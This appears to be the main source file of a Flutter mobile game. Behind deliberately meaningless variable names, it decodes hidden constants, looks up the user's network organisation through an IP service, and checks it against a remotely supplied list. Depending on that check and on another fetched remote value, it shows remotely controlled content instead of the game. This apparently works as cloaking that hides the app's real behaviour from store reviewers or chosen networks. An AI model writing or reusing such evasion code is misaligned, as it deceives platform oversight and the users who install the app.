import 'dart:convert';
import 'dart:io';
import 'package:connectivity/connectivity.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_application_1/game/data/constants.dart';
import 'package:http/http.dart' as http;
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'game/dataParams/constants.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:dio/dio.dart';
import 'game/music.dart';
import 'game/previewScreen/PreviewScreen.dart';
import 'game/settings/con.dart';
import 'game/settings/privx.dart';

bool? gsdfgdfscvds;
String cxdasdsa = '';

var _inited = false;
late final SharedPreferences gfdhgfddf;
final inAppReview = InAppReview.instance;

String gdsfgdfsg = '';
List<String> posgsdfgers = [];
List<bool> gfdgsdfg = [true, true];
bool dsaxasd = false;
String gdshfs = '';
Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  gfdhgfddf = await SharedPreferences.getInstance();
  Constants.inftp = cprtg(Constants.inftp, Constants.off);
  Constants.fasdfdas = cprtg(Constants.fasdfdas, Constants.off);

  String nax = gfdhgfddf.getString('key') ?? '';
  if (nax == 'none') {
    gsdfgdfscvds = false;
  } else if (nax.isNotEmpty) {
    gsdfgdfscvds = true;
    gdshfs = nax;
  } else {
    nonData = gdfsgdfs(nonData, -2);
    initilize();
  }

  OneSignal.shared.setLogLevel(OSLogLevel.verbose, OSLogLevel.none);
  OneSignal.shared.setAppId("74f4de5c-ea33-4d30-b2f5-f3406de80766");
  OneSignal.shared
      .promptUserForPushNotificationPermission()
      .then((accepted) {
  });
  await Future.delayed(const Duration(seconds: 2));
  reviewApp();
  runApp(MyApp());
}

Dio dio = Dio();
Future<bool> initilize() async {
  _inited = true;

  dio = Dio(
    BaseOptions(
      headers: {
        'apikey': Constants.k,
        'Authorization': 'Bearer ${Constants.k}',
      },
    ),
  );
  await dfsafdas();
  await gdfscsadvas();
  await jhfgnbhfg();

  if (gfdgsdfg[0] && gfdgsdfg[1]) return false;
  return false;
}

Future<String> jhfgnbhfg() async {
  try {
    final Response response = await dio.get(Constants.prl);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      String themesFetch =
          data.map((item) => item['coinsDuration'].toString()).join();

      if (themesFetch.contains(Constants.fasdfdas)) {
        gfdgsdfg[1] = false;
      } else {
        gdsfgdfsg = themesFetch;
        gfdgsdfg[1] = true;
        await fetchData(gdsfgdfsg);
      }
      return themesFetch;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

Future<String> gdfscsadvas() async {
  try {
    http.Response response = await http.get(Uri.parse(Constants.inftp));

    if (response.statusCode == 200) {
      Map<String, dynamic> data = jsonDecode(response.body);
      String darx = data['org'];
      contactx(posgsdfgers, darx);
      return darx;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

bool contactx(List<String> array, String inputString) {
  List<String> words = inputString.split(' ');
  List<String> arrayItems = [];
  for (String item in array) {
    arrayItems.addAll(item.split(', '));
  }
  for (String word in words) {
    for (String arrayItem in arrayItems) {
      if (arrayItem.toLowerCase().contains(word.toLowerCase())) {
        gfdgsdfg[0] = false;

        return false;
      } else {
        gfdgsdfg[0] = true;
      }
    }
  }

  return false;
}

Future<void> dfsafdas() async {
  dio = Dio(
    BaseOptions(
      headers: {
        'apikey': Constants.k,
        'Authorization': 'Bearer ${Constants.k}',
      },
    ),
  );
  final Response response = await dio.get(Constants.coins);
  if (response.statusCode == 200) {
    List<dynamic> data = response.data as List<dynamic>;
    posgsdfgers =
        data.map((item) => item['checkChestWithNewCoins'].toString()).toList();
  }
}

Future<void> reviewApp() async {
  bool alreadyRated = gfdhgfddf.getBool('already_rated') ?? false;
  if (!alreadyRated) {
    if (await inAppReview.isAvailable()) {
      inAppReview.requestReview();
      await gfdhgfddf.setBool('already_rated', true);
    }
  }
}

class MyApp extends StatefulWidget {
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final audioControl = AudioControl();

  @override
  void initState() {
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: MyHomeScreen(),
    );
  }
}

class MyHomeScreen extends StatefulWidget {
  @override
  State<MyHomeScreen> createState() => _MyHomeScreenState();
}

class _MyHomeScreenState extends State<MyHomeScreen> {
  @override
  void initState() {
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
      DeviceOrientation.portraitDown,
      DeviceOrientation.portraitUp,
    ]);
    return Scaffold(
      backgroundColor: const Color.fromARGB(255, 56, 13, 64),
      body: Center(
        child: FutureBuilder<bool>(
          future: checkCoinsData(),
          builder: (context, snapshot) {
            if (snapshot.data == null) {
              return OrientationBuilder(builder: (context, orientation) {
                if (orientation == Orientation.landscape) {
                  return Container(
                    height: ParamsAxis(context).height,
                    width: ParamsAxis(context).width,
                    child: Image.asset(
                      'assets/images/bg/bgPreviewHorizontal.png',
                      fit: BoxFit.fill,
                    ),
                  );
                } else {
                  return Container(
                    height: ParamsAxis(context).height,
                    width: ParamsAxis(context).width,
                    child: Image.asset(
                      'assets/images/bg/bgPreview.png',
                      fit: BoxFit.fill,
                    ),
                  );
                }
              });
            }
            if (snapshot.connectionState == ConnectionState.waiting) {
              return OrientationBuilder(builder: (context, orientation) {
                if (orientation == Orientation.landscape) {
                  return Container(
                    height: ParamsAxis(context).height,
                    width: ParamsAxis(context).width,
                    child: Image.asset(
                      'assets/images/bg/bgPreviewHorizontal.png',
                      fit: BoxFit.fill,
                    ),
                  );
                } else {
                  return Container(
                    height: ParamsAxis(context).height,
                    width: ParamsAxis(context).width,
                    child: Image.asset(
                      'assets/images/bg/bgPreview.png',
                      fit: BoxFit.fill,
                    ),
                  );
                }
              });
            } else if (snapshot.data == true) {
              return ShowDailyRewards(rewardCoinsAmount: gdshfs);
            } else if (snapshot.data == false) {
              return PreviewScreenGame();
            } else {
              return PreviewScreenGame();
            }
          },
        ),
      ),
    );
  }
}
